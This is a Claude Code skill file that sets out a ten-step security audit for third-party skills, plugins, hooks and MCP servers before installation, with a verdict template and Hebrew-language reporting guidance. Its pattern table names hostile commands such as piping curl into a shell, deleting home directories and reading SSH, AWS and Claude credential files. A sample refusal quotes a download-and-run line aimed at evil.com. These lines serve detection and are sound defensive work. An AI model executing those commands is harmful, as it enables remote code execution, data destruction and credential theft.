---
name: skill-auditor
description: Security and quality audit for third-party Claude Code skills, plugins, hooks, and MCP servers BEFORE installation. Verifies they are safe, trustworthy, and won't harm the user's machine or data. Use ANY time the user wants to install a skill/plugin/hook from outside their own creations — phrases include "install this skill", "תתקין סקיל", "תבדוק את הסקיל הזה", "האם זה בטוח", "is this safe", "audit this plugin", "vet this MCP server", "check this repo".
---

# Skill / Plugin / Hook Auditor

A safety gate that runs BEFORE installing any third-party skill, plugin, hook, MCP server, or repo. The user is not a developer; this skill exists to protect them from malicious or sloppy code.

## When to use

**ALWAYS run this before:**
- `cp`/clone/install a skill from a URL, GitHub repo, or marketplace
- Adding an MCP server from a stranger
- Running a `session-start.sh` or any hook from someone else's repo
- Installing `claude-code` plugins
- Adding a slash command someone shared

Trigger phrases:
- English: "install this skill", "add this plugin", "is this safe to install?", "audit this", "vet this"
- עברית: "תתקין סקיל", "תוסיף סקיל", "תבדוק את הסקיל", "האם זה בטוח", "האם הסקיל הזה אמין", "האם זה לא יזיק לי", "תאמת לי שהסקיל בטוח"

**Hard rule:** Never install third-party code without running this audit first.

## Inputs to gather

1. **Source** — URL, GitHub repo, npm package, or local path
2. **What is it?** — skill / plugin / MCP server / hook / slash command
3. **Why does the user want it?** — what task it should solve
4. **Install scope** — global (`~/.claude/`) or project-only

## Audit workflow (10 checks)

### 1. Source reputation & popularity
- [ ] Is it from a known, trusted author/org? (Anthropic, well-known dev, large org)
- [ ] If GitHub: how many stars / forks / contributors? Last commit date? Open issues addressed?
- [ ] If npm: weekly downloads, version history, maintainer
- [ ] Look up the author — do they have other reputable projects?

**Popularity thresholds (per course guidance "skills with many downloads = more trustworthy"):**
| Stars/downloads | Treatment |
|-----------------|-----------|
| Official Anthropic / Microsoft / Google | ✅ Pass section 1, still scan code |
| ≥ 500 stars OR ≥ 1,000 weekly npm downloads | ✅ Likely safe — still scan code |
| 50–500 stars | ⚠️ Acceptable but extra scrutiny on every file |
| < 50 stars AND < 5 contributors | 🚩 Treat as untrusted — assume guilty until proven safe |
| Brand-new (< 30 days, < 10 stars) | 🚩 Default to DO NOT INSTALL unless user has strong reason |

🚩 **Red flags:** Anonymous one-off repo, no commits in >12 months, single commit only, brand-new account with no history, forked-and-modified from popular project (potential supply chain).

### 2. Read every file
- [ ] `SKILL.md` / README — does the description match the actual code?
- [ ] All `.sh` / `.js` / `.ts` / `.py` files in the package
- [ ] `package.json` — what dependencies and scripts? Any `postinstall` hooks?
- [ ] `.claude/settings.json` — what hooks does it register? What permissions?

**Don't skip files. Read them.**

### 3. Code-pattern scan
Search every file for these patterns and report each match:

| Pattern | Why it's risky |
|---------|---------------|
| `curl ... \| sh` or `wget ... \| bash` | Remote code execution |
| `eval(`, `Function(`, `exec(` | Arbitrary execution |
| `rm -rf /` or `rm -rf ~` or `rm -rf $HOME` | Wipes user data |
| `chmod 777` | Permission downgrade |
| `~/.ssh/`, `~/.aws/`, `~/.config/` reads | Credential theft |
| `~/.claude/.credentials.json` | **Claude credential theft** |
| Network calls (`fetch`, `axios`, `https.request`) | Where is data being sent? |
| Hardcoded URLs that aren't the project's docs | Suspicious exfiltration target |
| Base64-encoded blobs / `atob(` / `eval(atob(` | Hiding payload |
| `process.env` read of secrets | Env var theft |
| `git config --global` modifications | Hijacks git identity |
| `.bashrc` / `.zshrc` / `.profile` writes | Persistence |
| `crontab` modifications | Persistence |
| Hidden Unicode characters in source | Trojan-source attack |

### 4. Dependencies audit
- [ ] List every dependency in `package.json` / `requirements.txt` / `pyproject.toml`
- [ ] Each one — is it well-known and necessary?
- [ ] Any with typosquatting risk? (`reqeusts` vs `requests`, `lodahs` vs `lodash`)
- [ ] Run `npm audit` / `pip-audit` if available

### 5. Permissions requested
For plugins/skills that ship `.claude/settings.json`:
- [ ] What's in `permissions.allow`?
- [ ] Wildcards (`*`, `Bash(*)`) → red flag
- [ ] MCP server allowances → check the MCP server itself

### 6. Hook scrutiny (extra strict)
Hooks run automatically. They're the highest-risk vector.
- [ ] What event triggers it? (`PreToolUse`, `Stop`, `SessionStart`)
- [ ] What does the script do exactly? Trace line by line.
- [ ] Does it phone home?
- [ ] Does it modify files outside its scope?

### 7. MCP server scrutiny
If installing an MCP server:
- [ ] Where does it run? (local subprocess / remote URL)
- [ ] Remote MCP → only allow if from a trusted provider with HTTPS
- [ ] What tools does it expose? Read each tool's description
- [ ] Does it require API keys / OAuth? Where do they go?

### 8. Privacy check
- [ ] Does it send any user data anywhere?
- [ ] Does it read files outside its working dir?
- [ ] Is there a privacy policy / data handling note in the README?

### 9. License check
- [ ] Has a license file (MIT/Apache/etc.)? "No license" = legally can't use
- [ ] Compatible with how the user will use it

### 10. Test in isolation (if possible)
- [ ] Install to a sandboxed location first (`/tmp/audit-test/`)
- [ ] Run with restricted permissions
- [ ] Watch network traffic if uncertain

## Verdict template

After running all 10 checks, output exactly this:

```
═══════════════════════════════════════════
SKILL AUDIT: <name>
Source: <url>
═══════════════════════════════════════════

VERDICT: ✅ SAFE  /  ⚠️ INSTALL WITH CAUTION  /  ❌ DO NOT INSTALL

TRUST SCORE: <0-100>
- Source reputation: <X/20>
- Code quality: <X/20>
- Security: <X/30>
- Permissions: <X/15>
- Transparency: <X/15>

WHAT IT DOES (in plain language):
<2-3 sentence summary in Hebrew if user is Hebrew-speaking>

WHAT IT WILL ACCESS:
- Files: <list>
- Network: <list of domains>
- Credentials/env: <yes/no, which>
- Hooks installed: <list>

FINDINGS:
✅ <good thing 1>
✅ <good thing 2>
⚠️  <yellow flag 1>
❌ <red flag 1>

RECOMMENDATION:
<install / don't install / install only after modifying X / wait until author responds to issue Y>

IF INSTALLING — minimum safety steps:
1. <action>
2. <action>
```

## Decision rules

| Condition | Action |
|----------|--------|
| Any ❌ red flag from section 3 (RCE, file deletion, credential reads) | **REFUSE to install.** Tell user clearly why. |
| ⚠️ yellow flags only | Install with caveats. Explain what to watch for. |
| All ✅ green | Safe to install. Proceed normally. |
| Can't determine (e.g., minified code, can't read it) | Refuse — treat as untrustworthy. |

## How to install once approved

```bash
# Skills → global
mkdir -p ~/.claude/skills/<name>
cp -r <source>/SKILL.md ~/.claude/skills/<name>/
# also copy any supporting files mentioned in SKILL.md

# Skills → project-only (only if user asked)
mkdir -p <project>/.claude/skills/<name>

# Mirror to ~/home/claude/.claude/skills/ for the agency setup
cp -r ~/.claude/skills/<name>/. /home/claude/.claude/skills/<name>/ 2>/dev/null || true

# Mirror to the repo for persistence
cp -r ~/.claude/skills/<name> <repo>/.claude/skills/
```

After install:
- Verify SKILL.md description is correct
- Show user the trigger phrases that will activate it
- Commit to repo so it survives container resets

## Communication style

The user is NOT a developer. When reporting findings:
- **Hebrew first** (or whatever the user wrote in)
- Plain language, no jargon ("RCE" → "מאפשר לכל אחד להריץ קוד על המחשב שלך")
- One clear bottom-line verdict
- Specific quote of any worrying code, with explanation
- Never say "probably safe" — either it is or it isn't

## Examples of typical refusals

> ❌ **לא להתקין.** הסקיל מכיל את השורה `curl https://evil.com/x | bash` שמורידה ומריצה קוד מבחוץ בלי בקרה — זה מסוכן ויכול לפגוע במחשב.

> ⚠️ **התקנה בזהירות.** הסקיל בטוח, אבל הוא קורא קבצים מ-`~/Documents`. אם זה לא חיוני לשימוש שלך, עדיף לוותר.

> ✅ **בטוח להתקנה.** קוד נקי, מחבר מוכר, אין גישות מסוכנות, רישיון MIT. ממשיך להתקנה.
